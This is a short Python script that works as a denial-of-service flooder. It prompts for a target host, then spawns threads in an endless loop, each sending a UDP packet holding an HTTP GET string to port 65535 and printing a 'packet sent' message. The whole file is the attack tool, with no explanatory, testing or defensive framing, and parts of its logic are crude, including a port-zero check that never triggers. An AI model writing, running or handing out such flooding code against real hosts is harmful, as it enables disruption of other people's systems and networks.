import threading
import socket

ip = socket.gethostbyname(input("IP: "))
port = 65535


def l7_udp():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        s.sendto(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode(), (ip, port))

        if port == 0:
            print("\033[32m[+]\033[0m L7 UDP Packet sent ->", ip)
        else:
            print(f"\033[32m[+]\033[0m L7 UDP Packet sent -> {ip}:{port}")

        s.close()

    except Exception as err:
        print("\033[31m[-]\033[0m", err)


while True:
    t = threading.Thread(target=l7_udp)
    t.start()
